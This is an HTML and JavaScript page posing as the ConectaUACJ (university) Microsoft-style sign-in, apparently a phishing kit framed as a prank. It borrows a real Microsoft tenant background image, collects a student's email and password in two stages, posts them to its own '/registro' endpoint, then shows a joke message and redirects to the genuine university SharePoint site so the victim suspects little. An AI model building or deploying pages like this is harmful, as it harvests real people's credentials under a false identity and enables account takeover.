<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Login - ConectaUACJ</title>
    <style>
        body {
            margin: 0;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            background: url('https://aadcdn.msauthimages.net/dbd5a2dd-btek24pzaanh-uqkpinyhlflcop5fncafldw-yp6cqg/logintenantbranding/0/illustration?ts=637732054328270513') no-repeat center center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: rgba(0, 0, 0, 0.801);
        }

        .overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }

        .login-container {
            position: relative;
            background: white;
            width: 400px;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            z-index: 1;
        }

        .logo {
            font-weight: bold;
            color: #1a4b8c;
            margin-bottom: 20px;
        }

        .logo span {
            color: #f28c28;
        }

        h2 {
            margin-bottom: 20px;
            font-weight: normal;
        }

        input {
            width: 100%;
            padding: 10px 5px;
            border: none;
            border-bottom: 1px solid #ccc;
            margin-bottom: 15px;
            font-size: 14px;
        }

        input:focus {
            outline: none;
            border-bottom: 1px solid #1a4b8c;
        }

        .link {
            font-size: 13px;
            color: #1a4b8c;
            text-decoration: none;
        }

        .link:hover {
            text-decoration: underline;
        }

        .btn {
            margin-top: 20px;
            float: right;
            background: #1a4b8c;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }

        .btn:hover {
            background: #163d70;
        }

        .options {
            margin-top: 80px;
            padding: 15px;
            background: #f2f2f2;
            text-align: center;
            font-size: 14px;
            cursor: pointer;
        }

        .stage {
            display: none;
        }

        .stage.active {
            display: block;
        }

        .back-button {
            display: inline-block;
            margin-bottom: 15px;
            text-decoration: none;
            color: inherit;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
        }

        .back-button:hover {
            text-decoration: none;
        }

        .email-display {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .spinner {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a4b8c;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
            display: none;
        }

        .message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }

        .message.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    
    <div class="login-container">
        <div class="logo">
            <img src="../static/bannerlogo.png" width="150px" alt="UACJ Logo">
        </div>
        
        <form id="registroForm">
            <!-- Stage 1: Email -->
            <div class="stage active" id="stage1">
                <h2>Sign in</h2>
                <input 
                    type="email" 
                    id="correo" 
                    name="correo" 
                    placeholder="someone@example.com" 
                    required
                >
                <a href="#" class="link">Can't access your account?</a>
                <button type="button" class="btn" id="btnNext">Next</button>
            </div>

            <!-- Stage 2: Password -->
            <div class="stage" id="stage2">
                <div class="back-button" id="btnBack"><img src="../static/arrow_left.svg" alt="back"><span id="emailDisplay"></span></div>
                <h2>Enter password</h2>
                <input 
                    type="password" 
                    id="contrasenia" 
                    name="contrasenia" 
                    placeholder="Password" 
                    required
                >
                <a href="#" class="link">Forgot my password</a>
                <div class="spinner" id="spinner"></div>
                <button type="submit" class="btn" id="btnRegistro">Sign in</button>
            </div>
            
            <div class="message" id="mensajeResultado"></div>
        </form>
    </div>

    <script>
        const stage1 = document.getElementById('stage1');
        const stage2 = document.getElementById('stage2');
        const correoInput = document.getElementById('correo');
        const contraseniaInput = document.getElementById('contrasenia');
        const btnNext = document.getElementById('btnNext');
        const btnBack = document.getElementById('btnBack');
        const btnRegistro = document.getElementById('btnRegistro');
        const spinner = document.getElementById('spinner');
        const mensajeResultado = document.getElementById('mensajeResultado');
        const emailDisplay = document.getElementById('emailDisplay');
        const registroForm = document.getElementById('registroForm');

        // Pasar a la segunda etapa
        btnNext.addEventListener('click', function(e) {
            e.preventDefault();
            
            const correo = correoInput.value;
            
            // Validación básica
            if (!correo) {
                return;
            }
            
            // Validación de formato de email
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
                return;
            }
            
            // Mostrar la segunda etapa
            emailDisplay.textContent = correo;
            stage1.classList.remove('active');
            stage2.classList.add('active');
            contraseniaInput.focus();
        });

        // Volver a la primera etapa
        btnBack.addEventListener('click', function(e) {
            e.preventDefault();
            stage2.classList.remove('active');
            stage1.classList.add('active');
            contraseniaInput.value = '';
            mensajeResultado.style.display = 'none';
            correoInput.focus();
        });

        // Enviar formulario (segunda etapa)
        registroForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const correo = correoInput.value;
            const contrasenia = contraseniaInput.value;
            
            // Validación básica
            if (!correo || !contrasenia) {
                mostrarMensaje('Por favor completa todos los campos', 'error');
                return;
            }
            
            // Mostrar spinner
            btnRegistro.disabled = true;
            spinner.style.display = 'block';
            mensajeResultado.style.display = 'none';
            
            try {
                const formData = new FormData();
                formData.append('correo', correo);
                formData.append('contrasenia', contrasenia);
                
                const response = await fetch('/registro', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.success) {
                    mostrarMensaje('¡Wazaaaaa, Bromitaaaa 👻! ' + data.message, 'success');
                    registroForm.reset();
                    
                    // Redirigir después de 3 segundos
                    setTimeout(() => {
                        window.location.href = 'https://alumnosuacj.sharepoint.com/sites/conectauacj';
                    }, 3000);
                } else {
                    mostrarMensaje(data.message, 'error');
                }
            } catch (error) {
                mostrarMensaje('Error en la conexión: ' + error.message, 'error');
            } finally {
                btnRegistro.disabled = false;
                spinner.style.display = 'none';
            }
        });
        
        function mostrarMensaje(texto, tipo) {
            mensajeResultado.textContent = texto;
            mensajeResultado.className = `message ${tipo}`;
            mensajeResultado.style.display = 'block';
        }
    </script>
</body>
</html>
